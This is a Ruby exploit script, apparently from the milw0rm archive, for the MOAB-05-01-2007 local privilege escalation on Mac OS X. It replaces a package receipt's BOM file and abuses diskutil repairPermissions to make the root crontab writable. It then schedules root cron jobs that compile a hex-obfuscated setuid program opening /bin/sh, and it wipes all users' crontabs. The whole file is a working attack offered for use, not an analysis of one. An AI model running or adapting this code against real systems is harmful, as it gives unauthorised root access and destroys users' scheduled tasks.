#!/usr/bin/ruby
# (c) 2006 LMH <lmh [at] info-pull.com>          (code from the other exploit, porting)
#          Kevin Finisterre <kf_lists [at] digitalmunition.com> (crontab rock and roll)
#
# Second exploit for MOAB-05-01-2007, uses crontab. much more simple than the other one.
# And works like a charm.

require 'fileutils'

EVIL_COMMANDS = [
		  "rm /Library/Receipts/Essentials.pkg/Contents/Archive.bom ",
		  "echo -e \"\\x6d\\x61\\x69\\x6e\\x28\\x29\\x7b\\x20\\x73\\x65\\x74\\x65\\x75\\x69\\x64\\x28\\x30\\x29\\x3b\\x20\\x73\\x65\\x74\\x65\\x67\\x69\\x64\\x28\\x30\\x29\\x3b\\x20\\x73\\x65\\x74\\x75\\x69\\x64\\x28\\x30\\x29\\x3b\\x20\\x73\\x65\\x74\\x67\\x69\\x64\\x28\\x30\\x29\\x3b\\x20\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x22\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x20\\x2d\\x69\\x22\\x29\\x3b\\x20\\x7d\\x0a\" > /tmp/finisterre.c",
		  "/usr/bin/cc -o /Users/Shared/shX /tmp/finisterre.c; rm /tmp/finisterre.c",
                  "/bin/cp -r /var/cron/tabs /Users/Shared", # I have no legit crontabs so I don't care. 
                  "/usr/bin/say Flavor Flave a k a `whoami` && sleep 5 && /usr/bin/say sleeping briefly &&  sleep 5 && chmod +s /Users/Shared/shX && sleep 5", 
		  "echo '' > /tmp/pwnclean",
                  "for each in `ls /var/cron/tabs/`; do  crontab -u $each /tmp/pwnclean; done", # Sorry if you had any legit crontabs...
		  "crontab /tmp/pwnclean", # Just to make sure
		  "rm -rf /tmp/pwn*",	
                ]
TARGET_BOM_PATH = "/Library/Receipts/Essentials.pkg/Contents/Archive.bom"
SHELL_TEMPLATE  = "mkdir -p /tmp/pwndertino/var/cron/tabs\n"  +
                  "cd /tmp/pwndertino\n"                      +
                  "chmod 777 var/cron/tabs\n"                 +
                  "mkbom . /tmp/pwned.bom\n"                  +
                  "cp /tmp/pwned.bom #{TARGET_BOM_PATH}\n"    +
                  "/usr/sbin/diskutil repairPermissions /\n"

if ARGV[0] != "repair"
  # Backup if its there! Some times it is not. 
  if File.exists?(TARGET_BOM_PATH)
    FileUtils.cp(TARGET_BOM_PATH, File.join("/Users/Shared", File.basename(TARGET_BOM_PATH)))
  end
 
  puts "++ Dropping the 31337 .sh skillz"
  shell_script = File.new("moab5.sh", "w")
  shell_script.print(SHELL_TEMPLATE)

  puts "++ Fixing up crontabs"
  
  EVIL_COMMANDS.each do |cmd|
    shell_script.print("echo '* * * * * #{cmd}' >> /var/cron/tabs/root\n")
  end

    
  shell_script.print("echo '* * * * * /bin/rm -rf /tmp/pwned.bom /tmp/pwndertino' >> /tmp/pwncron\n")
  shell_script.print("crontab /tmp/pwncron\n") # You may need to sleep here
  
  shell_script.close
  puts "++ Execute moab5.sh"
  FileUtils.chmod 0755, "./moab5.sh" 
  exec "/bin/sh", "-c", "./moab5.sh"
  puts "++ Run the repair script when you are all done."
else

  # minor repair for a post-testing scenario
  if File.exists?(File.join("/Users/Shared", File.basename(TARGET_BOM_PATH)))
    FileUtils.cp(File.join("/Users/Shared", File.basename(TARGET_BOM_PATH)), TARGET_BOM_PATH) # restore backup
    FileUtils.rm_f(File.join("/Users/Shared", File.basename(TARGET_BOM_PATH)))
    exec "/usr/sbin/diskutil repairPermissions /"

  else
    exec "/usr/sbin/diskutil repairPermissions /"
  end
  
end

# milw0rm.com [2007-01-05]